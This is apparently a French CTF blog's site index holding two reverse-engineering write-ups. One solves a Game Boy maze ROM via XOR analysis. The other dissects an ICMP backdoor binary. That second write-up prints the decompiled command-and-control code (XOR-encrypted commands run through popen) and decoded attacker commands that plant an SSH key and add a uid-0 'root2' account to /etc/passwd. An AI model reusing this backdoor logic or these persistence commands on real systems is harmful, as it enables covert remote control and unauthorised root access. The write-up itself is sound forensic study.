[{"content":"","date":"8 août 2025","externalUrl":null,"permalink":"/website/authors/alexis/","section":"Authors","summary":"","title":"Alexis","type":"authors"},{"content":"Ce challenge consiste en un fichier nommé Cavormice.gb. En utilisant la command file, nous pouvons voir que le fichier est une image ROM Game Boy.\n$ file Cavormice.gb Cavormice.gb: Game Boy ROM image (Rev.01) [ROM ONLY], ROM: 256Kbit Le fichier est donc probablement un jeu. Nous pouvons donc utiliser un émulateur pour vérifier cette hypothèse. Nous avons utilison mednafen pour émuler le jeu en utilisant la commande suivante.\n$ mednafen Cavormice.gb Avec cette information, nous avons chercher l\u0026rsquo;architecture de la Gameboy, qui est Sharp SM83. Maintenant, il nous faut des outils pour nous faciliter l\u0026rsquo;analyse. Nous sommes donc tomber sur un plugin ghidra qui a bien marché. Nous avions également prévu de faire de l\u0026rsquo;analyse dynamique et nous avons utiliser BGB qui est un debugger pour GameBoy.\nMaintenant, nous pouvons analyser ce qui ce passe dans le binaire.\nEn lançant le jeu, on remarque que l\u0026rsquo;on peut prendre des directions. Au bout de 32 choix, on nous notifie qu\u0026rsquo;on a perdu avec le message You lose…. Il faut donc trouver le chemin correct pour gagner.\nMaintenant, regardons le code en utilisant le plugin. Nous sommes tombés sur une fonction intéressante en utilisant le décompilateur Ghidra.\nvoid FUN_09a7 (void) { undefined extraout_C; if ((((DAT_c806 \u0026amp; 0x80) != 0 || (byte)(DAT_c806 + (0xf \u0026lt; DAT_c805)) == \u0026#39;\\0\u0026#39;) \u0026amp;\u0026amp; (DAT_c531 == \u0026#39;a\u0026#39;)) \u0026amp;\u0026amp; (DAT_c532 == -0x3e)) { FUN_06fc(0x55); FUN_0729(); FUN_0984(extraout_C); DAT_c803 = 0x58; DAT_c804 = 0; DAT_c805 = 0x97; DAT_c806 = 0; } if ((DAT_c806 \u0026amp; 0x80) != 0 || (byte)(DAT_c806 + (0xf \u0026lt; DAT_c805)) == \u0026#39;\\0\u0026#39;) { FUN_06fc(0x55); FUN_0968(); DAT_c803 = 0x58; DAT_c804 = 0; DAT_c805 = 0x97; DAT_c806 = 0; } if ((DAT_c806 \u0026amp; 0x80) == 0 \u0026amp;\u0026amp; (DAT_c805 \u0026lt; 0x98) \u0026lt;= DAT_c806) { FUN_06fc(0x44); FUN_0968(); DAT_c803 = 0x58; DAT_c804 = 0; DAT_c805 = 0x10; DAT_c806 = 0; } if ((DAT_c804 \u0026amp; 0x80) == 0 \u0026amp;\u0026amp; (DAT_c803 \u0026lt; 0xa0) \u0026lt;= DAT_c804) { FUN_06fc(0x52); FUN_0968(); DAT_c803 = 8; DAT_c804 = 0; DAT_c805 = 0x58; DAT_c806 = 0; } if ((DAT_c804 \u0026amp; 0x80) != 0 || (byte)(DAT_c804 + (7 \u0026lt; DAT_c803)) == \u0026#39;\\0\u0026#39;) { FUN_06fc(0x4c); FUN_0968(); DAT_c803 = 0x9f; DAT_c804 = 0; DAT_c805 = 0x58; DAT_c806 = 0; return; } return; } La fonction FUN_06fc semble très interessante. En effet, la fonction est appellé avec les arguments 0x55, 0x44, 0x52, 0x4c comme paramètres. Ces valeurs correspondent à des caractères ASCII. On retrouve respectivement U, D, R et L. Ces caractères sont possiblements les directions possibles dans le labyrinthe. Voici la décompilation de la fonction.\nvoid FUN_06fc(undefined param_1) { (\u0026amp;DAT_c808)[(char)DAT_c838] = param_1; DAT_c838 = DAT_c838 + 1; if ((DAT_c838 \u0026amp; 0x80) == 0 \u0026amp;\u0026amp; 0x20 \u0026lt; DAT_c838) { FUN_063c(); FUN_065e(); return; } return; } On peut voir que ces directions sont écrites dans DAT_c808. Il semblerait que la fonction FUN_09a7 enregistre les mouvements du labyrinthe. Un autre détail intétessant est le fait que FUN_09a7 dans la première condition appelle une fonction spéciale qui n\u0026rsquo;est pas appellé par les autres conditions. On voit que cela est fait quand on prend la direction Up.\nundefined FUN_0729(void) { char cVar1; int iVar2; byte bVar3; DAT_c807 = 0; if (DAT_c838 == \u0026#39; \u0026#39;) { for (iVar2 = 0; bVar3 = (byte)((uint)iVar2 \u0026gt;\u0026gt; 8), (byte)(!(bool)(bVar3 \u0026gt;\u0026gt; 7) \u0026lt;\u0026lt; 7 | bVar3 \u0026amp; 0x7f) \u0026lt; (byte)(((byte)iVar2 \u0026lt; 0x10) + 0x80U); iVar2 = iVar2 + 1) { cVar1 = (byte)iVar2 * \u0026#39;\\x02\u0026#39;; if ((\u0026amp;DAT_c828)[iVar2] != ((\u0026amp;DAT_c808)[(char)(cVar1 + 1)] ^ (\u0026amp;DAT_c808)[cVar1])) { DAT_c807 = 0; return 0; } } DAT_c807 = 1; } return DAT_c807; } Cette fonction agit comme une fonction de vérification. Nous avons un peu déobfusqué la logique pour donné une meilleure compréhension du code.\nbool check_function() { for (int i = 0; i \u0026lt; 16) { if (DAT_c828[i] != DAT_c808[2 * i] ^ DAT_c808[2 * i + 1]) { return false; } } return true; On voit quelque chose de très interessant, on retrouve DAT_c808 qui contient les directions du labyrinthe. On a une itération pair / impare qui compare les valeurs XORés entre elles avec une autre zone mémoire. En utilisant les propriétés du XOR, on peut récupérer les entrés correctes du labyrinthe si l\u0026rsquo;on retrouve DAT_c828. On sait également que l\u0026rsquo;on commence forcément par un mouvement Up dans le jeu. On a vu également qu\u0026rsquo;il faut finir par un mouvement Up. On peut retrouvé les entrées.\nNous avons essayé de récupérer DAT_c828 mais nous avons eu un problème.\nNous avons donc utiliser BGB pour récupérer les valeurs à l\u0026rsquo;exécution. Maintenant que nous avons récupérer les valeurs, nous avons plus qu\u0026rsquo;a programmer un petit script pour calculer l\u0026rsquo;entrée valide. Tout d\u0026rsquo;abord, nous avons calculé les valeurs XORés possibles en utilisant les combinaisons de directions deux à deux possibles.\ndata = [0x19, 0x19, 0x8, 0x16, 0x7, 0x00, 0x19, 0x11, 0x8, 0x16, 0x11, 0x19, 0x00, 0x1E, 0x7, 0x11] direction = [\u0026#39;U\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;L\u0026#39;] for i in direction: for j in direction: if i != j: print(f\u0026#34;{i} {j}: {hex(ord(i) ^ ord(j))}\u0026#34;) which gives:\n$ python3 script.py U D: 0x11 U R: 0x7 U L: 0x19 D U: 0x11 D R: 0x16 D L: 0x8 R U: 0x7 R D: 0x16 R L: 0x1e L U: 0x19 L D: 0x8 L R: 0x1e Maintenant, nous n\u0026rsquo;avons plus qu\u0026rsquo;a trouvé la bonne combinaison avec les valeurs dans data.\nSo we just had to find the right combination to get the value wanted in the data array.\ndata = [0x19, 0x19, 0x8, 0x16, 0x7, 0x00, 0x19, 0x11, 0x8, 0x16, 0x11, 0x19, 0x00, 0x1E, 0x7, 0x11] direction = [\u0026#39;U\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;L\u0026#39;] setofdirection = {0x19: \u0026#39;UL\u0026#39;, 0x8: \u0026#39;DL\u0026#39;, 0x16: \u0026#39;DR\u0026#39;, 0x7: \u0026#39;UR\u0026#39;, 0x0: \u0026#39;SameThing\u0026#39;, 0x11: \u0026#39;DU\u0026#39;, 0x1E: \u0026#39;LR\u0026#39;} for el in data: print(f\u0026#34;{setofdirection.get(el, \u0026#39;Unknown\u0026#39;)}\u0026#34;, end=\u0026#39; \u0026#39;) Ce qui donne.\n$ python3 script.py UL UL DL DR UR SameThing UL DU DL DR DU UL SameThing LR UR DU Il manque cependant une règle à laquelle nous n\u0026rsquo;avons pas pensé : il faut allez en bas après avoir été en haut (sauf pour le premier et le dernier mouvement) car la salle du dessus bloque le joueur.\nLa combinaison devient donc:\nULLUDLRDRUDDLUDUDLDRUDLUDDLRRUDU Une fois que l\u0026rsquo;on effectue la bonne combinaison, on obtient un coffre dans la salle.\nLe flag est donc:\nAMSI{ULLUDLRDRUDDLUDUDLDRUDLUDDLRRUDU} ","date":"8 août 2025","externalUrl":null,"permalink":"/website/posts/cavormice/multi-author/","section":"Blog","summary":"","title":"AMSI CTF 2025 - Reverse Engineering - Cavormice","type":"posts"},{"content":"","date":"8 août 2025","externalUrl":null,"permalink":"/website/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"Vous pouvez retrouvez des articles sur les différents projets auquel je consacre du temps au quotidien. Je participe souvent à des événements de type CTF. Ce sont des compétitions qui permettent de s\u0026rsquo;entraîner sur des concepts divers de cybersécurité. Je poste réguliérement des solutions aux challenges que j\u0026rsquo;ai résolu.\n","date":"8 août 2025","externalUrl":null,"permalink":"/website/posts/","section":"Blog","summary":"","title":"Blog","type":"posts"},{"content":"","date":"8 août 2025","externalUrl":null,"permalink":"/website/authors/lyes-bourennani/","section":"Authors","summary":"","title":"Lyes BOURENNANI","type":"authors"},{"content":"","date":"8 août 2025","externalUrl":null,"permalink":"/website/","section":"m1nds","summary":"","title":"m1nds","type":"page"},{"content":" Contexte # Le challenge est composé d\u0026rsquo;un fichier PCAP qui est une capture réseau et d\u0026rsquo;un binaire. La capture réseau contient des messages ICMP, avec certains messages qui sont malformés. Le binaire est un binaire ELF x86_64. Le binaire n\u0026rsquo;est pas stripped. Le contexte nous explique qu\u0026rsquo;une machine a été compromise et qu\u0026rsquo;un artefact a été retrouvé. Il faut comprendre ce qu\u0026rsquo;il s\u0026rsquo;est passé.\nfile pwntopiashl capture.pcap pwntopiashl: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7ea5fda28b3a88f7a5f8cf761870503215d8aa50, for GNU/Linux 3.2.0, not stripped capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535) Nous pouvoons utiliser un décompilateur pour mieux comprendre comment le binaire se comporte. Il n\u0026rsquo;y a pas de sécurité qui obfusque le binaire, donc on peut directement voir les méchanismes de manière assez claire pour comprendre le binaire.\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax __int64 v4; // rdi v3 = time(0LL); v4 = v3; srand(v3); icmp_packet_listener(v4); } void __noreturn icmp_packet_listener() { size_t v0; // rbx size_t v1; // rbx size_t v2; // rbx int v3; // eax struct sockaddr addr; // [rsp+0h] [rbp-C810h] BYREF char buf[2]; // [rsp+10h] [rbp-C800h] BYREF __int16 v6; // [rsp+12h] [rbp-C7FEh] char v7[8]; // [rsp+18h] [rbp-C7F8h] BYREF __int64 v8; // [rsp+20h] [rbp-C7F0h] BYREF __int16 v9; // [rsp+38h] [rbp-C7D8h] __int16 v10; // [rsp+3Ah] [rbp-C7D6h] char v11; // [rsp+3Ch] [rbp-C7D4h] char v12; // [rsp+3Dh] [rbp-C7D3h] __int16 v13; // [rsp+3Eh] [rbp-C7D2h] char dest[25536]; // [rsp+40h] [rbp-C7D0h] BYREF char s[20]; // [rsp+6400h] [rbp-6410h] BYREF char v16; // [rsp+6414h] [rbp-63FCh] BYREF int v17; // [rsp+C7C0h] [rbp-50h] unsigned int v18; // [rsp+C7C4h] [rbp-4Ch] FILE *stream; // [rsp+C7C8h] [rbp-48h] int v20; // [rsp+C7D0h] [rbp-40h] int v21; // [rsp+C7D4h] [rbp-3Ch] char *v22; // [rsp+C7D8h] [rbp-38h] char *v23; // [rsp+C7E0h] [rbp-30h] int fd; // [rsp+C7ECh] [rbp-24h] int i; // [rsp+C7F0h] [rbp-20h] int j; // [rsp+C7F4h] [rbp-1Ch] int v27; // [rsp+C7F8h] [rbp-18h] unsigned int v28; // [rsp+C7FCh] [rbp-14h] fd = socket(2, 3, 1); if ( fd \u0026lt; 0 ) exit(1); while ( 1 ) { do memset(s, 0, 0x63C0uLL); while ( recv(fd, s, 0x63BFuLL, 0) \u0026lt;= 0 ); v23 = s; v22 = \u0026amp;v16; v21 = 28; if ( v16 == 12 \u0026amp;\u0026amp; v22[1] == 35 ) { v9 = *((_WORD *)v22 + 1); LOBYTE(v10) = rand(); HIBYTE(v10) = rand(); v11 = v9 ^ HIBYTE(v9); v12 = v10 ^ HIBYTE(v10); v13 = v9 ^ v10; memset(buf, 0, 0x20uLL); addr.sa_family = 2; *(_DWORD *)\u0026amp;addr.sa_data[2] = *((_DWORD *)v23 + 3); buf[0] = 0; v6 = v10; sleep(1u); sendto(fd, buf, v20 + 8LL, 0, \u0026amp;addr, 0x10u); } if ( *v22 == 19 \u0026amp;\u0026amp; v22[1] == 42 ) { addr.sa_family = 2; *(_DWORD *)\u0026amp;addr.sa_data[2] = *((_DWORD *)v23 + 3); memset(dest, 0, sizeof(dest)); memcpy(dest, \u0026amp;s[v21], (unsigned int)(25535 - v21)); for ( i = 25536; ; --i ) { v0 = i; if ( v0 \u0026lt; strlen(dest) || dest[i - 1] ) break; } for ( j = 0; j \u0026lt; i; ++j ) dest[j] ^= *((_BYTE *)\u0026amp;v9 + (j \u0026amp; 7)); puts(dest); fflush(_bss_start); stream = popen(dest, \u0026#34;r\u0026#34;); if ( stream ) { memset(dest, 0, sizeof(dest)); memset(s, 0, 0x63C0uLL); while ( fgets(s, 25536, stream) ) { v1 = strlen(dest); if ( v1 + strlen(s) \u0026gt; 0x63BE ) break; strcat(dest, s); } pclose(stream); i = strlen(dest); for ( j = 0; j \u0026lt; i; ++j ) dest[j] ^= *((_BYTE *)\u0026amp;v9 + (j \u0026amp; 7)); for ( i = 25536; ; --i ) { v2 = i; if ( v2 \u0026lt; strlen(dest) || dest[i - 1] ) break; } v27 = 0; v28 = i; v18 = ((unsigned __int64)i \u0026gt;\u0026gt; 4) + 1; for ( j = 0; j \u0026lt; (int)v18; ++j ) { memset(buf, 0, 0x20uLL); buf[0] = 8; v3 = v28; if ( v28 \u0026gt; 0x10 ) v3 = 16; v17 = v3; sprintf(v7, \u0026#34;%04d%04d\u0026#34;, (unsigned int)(j + 1), v18); memcpy(\u0026amp;v8, \u0026amp;dest[v27], v17); v27 += v17; v28 -= v17; sleep(1u); sendto(fd, buf, v17 + 16LL, 0, \u0026amp;addr, 0x10u); } } } } } On peut donc voir que le programme écoute les messages ICMP. Cependant, sous certaines conditions, des actions sont effectués et elles ont l\u0026rsquo;air malicieuses.\nHandshake # On peut voir des vérifications qui sont faites sur les données des trames ICMP. Si l\u0026rsquo;on retrouve une entête particulière, certaines actions sont effectuées. Premièrement, si l\u0026rsquo;entête est b'\\x0c\\x23', on prend une partie du message pour construire une clé de chiffrement avec le générateur pseudo-aléatoire de la libc (srand(), rand()). On voit que le programme répond au message avec la donnée générée. On reconnait une forme de handshake.\nif ( v16 == 12 \u0026amp;\u0026amp; v22[1] == 35 ) { v9 = *((_WORD *)v22 + 1); LOBYTE(v10) = rand(); HIBYTE(v10) = rand(); v11 = v9 ^ HIBYTE(v9); v12 = v10 ^ HIBYTE(v10); v13 = v9 ^ v10; memset(buf, 0, 0x20uLL); addr.sa_family = 2; *(_DWORD *)\u0026amp;addr.sa_data[2] = *((_DWORD *)v23 + 3); buf[0] = 0; v6 = v10; sleep(1u); sendto(fd, buf, v20 + 8LL, 0, \u0026amp;addr, 0x10u); } Command \u0026amp; Control # Si l\u0026rsquo;entête est b'\\x13\\x2A', on peut voir que l\u0026rsquo;on récupére le message et qu\u0026rsquo;on le déchiffre en utilisant XOR avec la clé générer précédement. Le message déchiffré est passé à un appel de popen() qui va permettre une exécution de commande. La sortie de la commande est renvoyé en utilisant le même chiffrement avec la même clé. On comprend donc que c\u0026rsquo;est un mechanisme \u0026ldquo;porte derobée\u0026rdquo; que l\u0026rsquo;on retrouve souvent dans les modules Command \u0026amp; Control (C2).\nif ( *v22 == 19 \u0026amp;\u0026amp; v22[1] == 42 ) { addr.sa_family = 2; *(_DWORD *)\u0026amp;addr.sa_data[2] = *((_DWORD *)v23 + 3); memset(dest, 0, sizeof(dest)); memcpy(dest, \u0026amp;s[v21], (unsigned int)(25535 - v21)); for ( i = 25536; ; --i ) { v0 = i; if ( v0 \u0026lt; strlen(dest) || dest[i - 1] ) break; } for ( j = 0; j \u0026lt; i; ++j ) dest[j] ^= *((_BYTE *)\u0026amp;v9 + (j \u0026amp; 7)); puts(dest); fflush(_bss_start); stream = popen(dest, \u0026#34;r\u0026#34;); if ( stream ) { memset(dest, 0, sizeof(dest)); memset(s, 0, 0x63C0uLL); while ( fgets(s, 25536, stream) ) { v1 = strlen(dest); if ( v1 + strlen(s) \u0026gt; 0x63BE ) break; strcat(dest, s); } pclose(stream); i = strlen(dest); for ( j = 0; j \u0026lt; i; ++j ) dest[j] ^= *((_BYTE *)\u0026amp;v9 + (j \u0026amp; 7)); for ( i = 25536; ; --i ) { v2 = i; if ( v2 \u0026lt; strlen(dest) || dest[i - 1] ) break; } v27 = 0; v28 = i; v18 = ((unsigned __int64)i \u0026gt;\u0026gt; 4) + 1; for ( j = 0; j \u0026lt; (int)v18; ++j ) { memset(buf, 0, 0x20uLL); buf[0] = 8; v3 = v28; if ( v28 \u0026gt; 0x10 ) v3 = 16; v17 = v3; sprintf(v7, \u0026#34;%04d%04d\u0026#34;, (unsigned int)(j + 1), v18); memcpy(\u0026amp;v8, \u0026amp;dest[v27], v17); v27 += v17; v28 -= v17; sleep(1u); sendto(fd, buf, v17 + 16LL, 0, \u0026amp;addr, 0x10u); } } Récupération des commandes # On comprend mieux l\u0026rsquo;intêret de la capture réseau. On va pouvoir récupérer les commandes et les sorties qui sont chiffrés. On se rappelle le mechanisme de handshake pour récupérer les clés de chiffrement et on n\u0026rsquo;a plus qu\u0026rsquo;a déchiffrer les messages contenant les commandes et sorties. J\u0026rsquo;ai pu réaliser un petit script Python en utilisant scapy qui va permettre de récupérer les messages. Il se base sur les manipulations des entêtes pour récupérer les parties qui permettent de reconsituer les clés.\n# decode_c2_data.py from scapy.all import * from itertools import cycle def generate_xor_key(key: int, r: int) -\u0026gt; bytes: key_lo = key \u0026amp; 0xFF key_hi = (key \u0026gt;\u0026gt; 8) \u0026amp; 0xFF r_lo = r \u0026amp; 0xFF r_hi = (r \u0026gt;\u0026gt; 8) \u0026amp; 0xFF kxor = key ^ r return bytes([ key_lo, key_hi, r_lo, r_hi, key_hi ^ key_lo, r_hi ^ r_lo, kxor \u0026amp; 0xFF, (kxor \u0026gt;\u0026gt; 8) \u0026amp; 0xFF ]) def dump_data(pcap_path): packets = rdpcap(pcap_path) key = None for i in range(len(packets)): data = bytes(packets[i][ICMP]) if i != len(packets) - 1: next_data = bytes(packets[i + 1][ICMP]) if data[0:2] == b\u0026#39;\\x0c\\x23\u0026#39;: first = int.from_bytes(data[2:4], byteorder=\u0026#39;little\u0026#39;) second = int.from_bytes(next_data[2:4], byteorder=\u0026#39;little\u0026#39;) print(f\u0026#34;Key init found! first = {hex(first)} \u0026amp; second = {hex(second)}\u0026#34;) key = generate_xor_key(first, second) elif data[0:2] == b\u0026#39;\\x13\\x2A\u0026#39;: cipher = data[8:] plain = \u0026#34;\u0026#34;.join([chr(a ^ b) for a,b in zip(cipher, cycle(key))]) print(f\u0026#34;Found plain: {plain}\u0026#34;) else: cipher = data[8:] plain = \u0026#34;\u0026#34;.join([chr(a ^ b) for a,b in zip(cipher, cycle(key))]) plain = plain[8:] print(f\u0026#34;{plain}\u0026#34;) dump_data(\u0026#34;capture.pcap\u0026#34;) Here is the output of our little script :\npython3 decode_c2_data.py Key init found! first = 0xada \u0026amp; second = 0xe0de Found plain: id uid=0(root) gid= 0(root) groups=0 (root) Found plain: mkdir /root/.ssh \u0026amp;\u0026amp; echo \u0026#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx+J8mv79rAqohohfdnzJDBS6wfnl1RT0CUeIYqqoWv7VTgiCMmmG7ww4jfWtX4IXb6KN1uO17Jpfqod0brs3QHgiwpwhGbdurPMGbZwmJaXdCbf69ZTzf1YYn9xv5SxUrlGg9/UAs2QbHPt0rcrv5Y7b47IUodm8H9P6SiVddhGIpRViToBJZ83leGaTMfH2W9moWfMtcNegNmrIc3ObfLa0/T03Ag2nwjNkoBOwbR/S5wsQYuEufDHNF4eAeWKI+UsRB19yrKOmrsrlnQ831JSiYQ5VCDcchyHW2FqEkf/LK4mBE2Y/u8etAwzgi9dVbO4dhV1cG4JdUE5X/mhphktZM0zy3/i6AstWKalDyUnKSRkFi+iAm3bj5rg6eZsbWXzoiOQHvIjBtjkTIaneufmLMqj5rNUnOgBI1glAMp5rDewqH5Wga90lddtBDN698ULoIQR+TTe/1fryGcBcKNXiRBfe2fqqK0i9wOY20xu/4tPZAilo/RQxKBXEq5gs=\u0026#39; \u0026gt; /root/.ssh/id_rsa.pub Found plain: cat /root/.ssh/id_rsa.pub ssh-rsa AAAAB3Nz aC1yc2EAAAADAQAB AAABgQCx+J8mv79r AqohohfdnzJDBS6w fnl1RT0CUeIYqqoW v7VTgiCMmmG7ww4j fWtX4IXb6KN1uO17 Jpfqod0brs3QHgiw pwhGbdurPMGbZwmJ aXdCbf69ZTzf1YYn 9xv5SxUrlGg9/UAs 2QbHPt0rcrv5Y7b4 7IUodm8H9P6SiVdd hGIpRViToBJZ83le GaTMfH2W9moWfMtc NegNmrIc3ObfLa0/ T03Ag2nwjNkoBOwb R/S5wsQYuEufDHNF 4eAeWKI+UsRB19yr KOmrsrlnQ831JSiY Q5VCDcchyHW2FqEk f/LK4mBE2Y/u8etA wzgi9dVbO4dhV1cG 4JdUE5X/mhphktZM 0zy3/i6AstWKalDy UnKSRkFi+iAm3bj5 rg6eZsbWXzoiOQHv IjBtjkTIaneufmLM qj5rNUnOgBI1glAM p5rDewqH5Wga90ld dtBDN698ULoIQR+T Te/1fryGcBcKNXiR Bfe2fqqK0i9wOY20 xu/4tPZAilo/RQxK BXEq5gs= Key init found! first = 0xff3c \u0026amp; second = 0xe8b4 Found plain: openssl passwd pwnt0p14 $1$d0QECrET$duOS z/ZMGfKaSPgyxagI n0 Found plain: echo \u0026#39;root2:$1$d0QECrET$duOSz/ZMGfKaSPgyxagIn0:0:0:root:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd Found plain: tail -n 1 /etc/passwd root2:$1$d0QECrE T$duOSz/ZMGfKaSP gyxagIn0:0:0:roo t:/root:/bin/bas h Key init found! first = 0xaea \u0026amp; second = 0x44dc Found plain: pwd /tmp/pwntopia Found plain: ls -la total 44 drwxr-x r-x 2 root root 4096 Mar 10 17 :18 . drwxrwxrwt 29 root root 16 384 Mar 10 17:50 .. -rwxr-xr-x 1 root root 1688 0 Mar 10 17:49 p wntopiashl -rw-r --r-- 1 root ro ot 31 Mar 10 17:18 .secret Found plain: cat .secret | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops U2FsdGVkX1+sDd5g 4JCxThLBMo/IsCKi wxriZAOdcfL7Y8ce jGFLo3jpAiyuyx7o Key init found! first = 0x3d56 \u0026amp; second = 0x7093 On peut voir que l\u0026rsquo;attaquant a ajouté de la persistance en ajoutant une clé publique RSA pour pouvoir se connecté via SSH à l\u0026rsquo;utilisateur root. Il a également créer un nouvel utilisateur root2 en ajoutant root2:$1$d0QECrET$duOSz/ZMGfKaSPgyxagIn0:0:0:root:/root:/bin/bash au fichier /etc/passwd. On voit également l\u0026rsquo;existance d\u0026rsquo;un fichier .secret qui a été exfiltré en utilisant un chiffrement AES-256-CBC. Comme nous avons les informations en claire, nous pouvons juste déchiffrer en utilisant openssl avec le mot de passe we_pwned_nops.\ncat \u0026gt; cipher.txt \u0026lt;\u0026lt;EOF U2FsdGVkX1+sDd5g 4JCxThLBMo/IsCKi wxriZAOdcfL7Y8ce jGFLo3jpAiyuyx7o EOF openssl enc -aes-256-cbc -d -a -salt -pbkdf2 -pass pass:we_pwned_nops -in cipher.txt N0PS{v3Ry_s734lThY_1cMP_sh3Ll} ","date":"8 août 2025","externalUrl":null,"permalink":"/website/posts/pwntopiashl/pwntopiashl/","section":"Blog","summary":"","title":"N0PSCTF 2025 - Reverse Engineering - pwntopiashl","type":"posts"},{"content":"","externalUrl":null,"permalink":"/website/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/website/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/website/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]